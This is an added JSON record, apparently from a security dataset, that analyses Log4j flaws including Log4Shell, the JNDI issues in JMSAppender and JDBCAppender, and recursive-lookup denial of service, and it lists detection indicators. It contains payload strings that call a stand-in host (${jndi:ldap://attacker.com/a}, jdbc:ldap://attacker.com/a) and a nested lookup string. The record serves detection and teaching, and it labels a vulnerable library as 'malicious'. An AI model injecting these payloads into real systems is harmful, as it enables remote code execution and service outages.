@@ -1,0 +1,159 @@
+{
+  "package_info": {
+    "package_name": "org.apache.logging.log4j:log4j-core",
+    "package_manager": "Maven",
+    "package_versions": "2.0-beta9 through 2.17.0 (excluding security fix releases 2.3.2, 2.12.4, and versions after 2.17.1)",
+    "why_malicious": "The package contains multiple critical vulnerabilities, most notably Log4Shell (CVE-2021-44228) and related flaws, which enable remote code execution (RCE), arbitrary code execution (ACE), information leakage, and denial of service (DoS) through unsafe JNDI lookups and recursive string substitutions. Attackers can exploit these vulnerabilities by injecting specially crafted log messages or manipulating configuration files, leading to full system compromise or service disruption."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when logging user-controlled input)",
+        "file_location": "log4j-core (Logger class, JNDI lookup handling)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "Logger.error(\"${jndi:ldap://attacker.com/a}\");",
+      "code_language": "java",
+      "code_behavior": "At runtime, when a log message containing a JNDI lookup pattern is processed, the code performs a JNDI lookup to an attacker-controlled LDAP server, retrieves and loads remote code, and executes it within the application context, resulting in remote code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The code enables arbitrary JNDI lookups based on untrusted log input, allowing attackers to trigger remote code execution by injecting a crafted string into application logs.",
+        "violated_expectations": "Standard logging libraries should never execute remote code or initiate network lookups based solely on log message content. Here, user input directly leads to code execution, violating the principle of input/output separation.",
+        "similar_legitimate_use": "JNDI lookups are sometimes used for legitimate resource resolution in enterprise Java applications, but never with untrusted or user-supplied input.",
+        "key_indicators": [
+          "Presence of ${jndi:...} patterns in log messages",
+          "JNDI lookup triggered by log message content",
+          "Outbound LDAP/S or RMI connections initiated by the logging process",
+          "Execution of code loaded from attacker-controlled servers"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when using JMSAppender with attacker-controlled config)",
+        "file_location": "log4j:log4j (org.apache.log4j.net.JMSAppender class)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "JMSAppender configured with attacker-controlled parameters, leading to JNDI requests and deserialization of untrusted data.",
+      "code_language": "java",
+      "code_behavior": "At runtime, if the JMSAppender is enabled and configured with attacker-controlled parameters, the code deserializes untrusted data received from a remote source and performs JNDI lookups, resulting in arbitrary code execution within the application.",
+      "malice_analysis": {
+        "why_suspicious": "Deserialization of untrusted data and JNDI lookups from configuration parameters allow attackers to execute arbitrary code by supplying malicious serialized objects or JNDI endpoints.",
+        "violated_expectations": "Appender configuration should not allow untrusted input to trigger code execution, deserialization, or network requests. Logging appenders are expected to safely transmit log data, not process or execute remote content.",
+        "similar_legitimate_use": "JMSAppender is used for logging to message queues in trusted, internal environments, but should never accept untrusted or externally controlled configuration.",
+        "key_indicators": [
+          "JMSAppender enabled in log4j configuration",
+          "JNDI lookup endpoints specified in appender parameters",
+          "Deserialization of data from untrusted or external sources",
+          "Unexpected network activity from logging components"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when using JDBCAppender with attacker-controlled config)",
+        "file_location": "log4j-core (JDBCAppender configuration)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "JDBCAppender configured with a JNDI URI as a data source, e.g. jdbc:ldap://attacker.com/a",
+      "code_language": "java",
+      "code_behavior": "At runtime, if the JDBCAppender is configured with a JNDI URI as a data source, the code performs a JNDI lookup to an attacker-controlled server, which can return malicious objects or code, resulting in arbitrary code execution within the application.",
+      "malice_analysis": {
+        "why_suspicious": "Allowing JNDI URIs in JDBCAppender configuration enables attackers to trigger remote code execution by manipulating the data source to point to a malicious JNDI endpoint.",
+        "violated_expectations": "JDBCAppender should only use trusted, local data sources and never accept remote JNDI URIs, as this exposes the application to remote code loading and execution.",
+        "similar_legitimate_use": "JDBCAppender is intended for logging to trusted databases, not for dynamic resolution of data sources via untrusted JNDI URIs.",
+        "key_indicators": [
+          "JDBCAppender configured with JNDI-based data source URIs",
+          "Remote JNDI lookups initiated by database logging components",
+          "Outbound LDAP or RMI connections from JDBCAppender"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (when processing recursive lookups in log messages)",
+        "file_location": "log4j-core (PatternLayout, string substitution logic)",
+        "required_permissions": []
+      },
+      "code_snippet": "Log message with recursive lookups: ${${::-${::-$${::-j}}}}",
+      "code_language": "java",
+      "code_behavior": "At runtime, when a log message containing recursive lookup patterns is processed, the code repeatedly evaluates nested substitutions, leading to uncontrolled recursion and stack overflow, which results in denial of service by crashing the logging process or application.",
+      "malice_analysis": {
+        "why_suspicious": "Uncontrolled recursion in string substitution can be triggered by specially crafted input, causing stack overflow and denial of service. This allows an attacker to crash the application by simply sending a malicious log message.",
+        "violated_expectations": "Logging frameworks should not allow user input to cause stack overflows or process termination. Input should be safely handled and bounded to prevent resource exhaustion.",
+        "similar_legitimate_use": "There is no legitimate use case for recursive lookups in log messages; such patterns are not used in normal application logging.",
+        "key_indicators": [
+          "Recursive or nested lookup patterns in log messages (e.g., ${${...}})",
+          "Stack overflow or excessive resource consumption during log processing",
+          "Application or logging process crashes correlated with crafted log input"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted log message or manipulates configuration to include a JNDI lookup pattern or recursive lookup.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Triggering of JNDI lookup or recursive processing in the vulnerable Log4j code."
+    },
+    {
+      "step": 2,
+      "action": "Vulnerable Log4j code processes the input, performing a JNDI lookup to an attacker-controlled server or evaluating recursive substitutions.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "Remote code execution, arbitrary code execution, or denial of service."
+    },
+    {
+      "step": 3,
+      "action": "Attacker gains code execution, installs malware, steals data, or causes service outage.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3",
+        "snippet_4"
+      ],
+      "leads_to": "System compromise or service disruption (final goal)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log messages containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar JNDI lookup patterns",
+      "JNDI lookups triggered by log message content or configuration parameters",
+      "JMSAppender or JDBCAppender configured with JNDI URIs in log4j configuration files",
+      "Recursive or nested lookup patterns in log messages (e.g., ${${...}})",
+      "Unexpected outbound LDAP, RMI, or other JNDI-related network connections from Java processes"
+    ],
+    "file_indicators": [
+      "Presence of org/apache/logging/log4j/core/lookup/JndiLookup.class in log4j-core JAR",
+      "Presence of org/apache/log4j/net/JMSAppender.class in log4j JAR",
+      "Log4j configuration files (e.g., log4j2.xml, log4j.properties) referencing JNDI, JMSAppender, or JDBCAppender with JNDI URIs"
+    ],
+    "network_indicators": [
+      "Outbound LDAP, RMI, or other JNDI-related connections to untrusted or external servers",
+      "Connections to attacker-controlled domains or IPs from Java applications, especially during log processing"
+    ],
+    "how_to_detect": "Scan application dependencies for vulnerable log4j-core and log4j JARs by checking for affected versions and the presence of JndiLookup.class. Monitor logs and network traffic for JNDI lookup patterns in log messages and unexpected outbound LDAP/RMI connections. Audit configuration files for use of JMSAppender, JDBCAppender with JNDI URIs, or references to JndiLookup. Remove or update vulnerable classes and upgrade to fixed versions (2.17.1 or later). Implement input validation and restrict network access from Java processes where possible."
+  }
+}
